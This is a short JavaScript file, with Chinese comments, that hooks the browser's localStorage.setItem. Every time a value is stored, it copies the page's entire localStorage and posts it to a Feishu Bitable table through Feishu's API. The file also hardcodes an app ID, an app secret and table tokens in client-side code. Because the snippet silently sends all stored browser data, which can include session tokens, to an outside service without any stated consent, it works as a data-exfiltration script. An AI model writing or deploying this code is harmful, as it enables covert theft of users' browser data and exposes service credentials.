const APP_ID = "cli_aaa52804f9395cca";
const APP_SECRET = "y9XDi31WF1OVS1EscOQdDAIzi87AKCDk";
const APP_TOKEN = "GytxwLLRBiVPEyk096EcfEm1neg";
const TABLE_ID = "tbl2SIu43stcfoae";

// 获取 token
async function getToken() {
  const res = await fetch("https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      app_id: APP_ID,
      app_secret: APP_SECRET
    })
  });

  const data = await res.json();
  return data.tenant_access_token;
}

// 写入飞书
async function pushToFeishu(data) {
  const token = await getToken();

  await fetch(
    `https://open.feishu.cn/open-apis/bitable/v1/apps/${APP_TOKEN}/tables/${TABLE_ID}/records`,
    {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${token}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        fields: {
          data: JSON.stringify(data),
          time: new Date().toISOString()
        }
      })
    }
  );
}

// 监听 localStorage 变化（你原来的逻辑）
(function () {
  const oldSet = localStorage.setItem;

  localStorage.setItem = function (key, value) {
    oldSet.apply(this, arguments);

    const snapshot = {};

    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      snapshot[k] = localStorage.getItem(k);
    }

    pushToFeishu(snapshot);
  };
})();
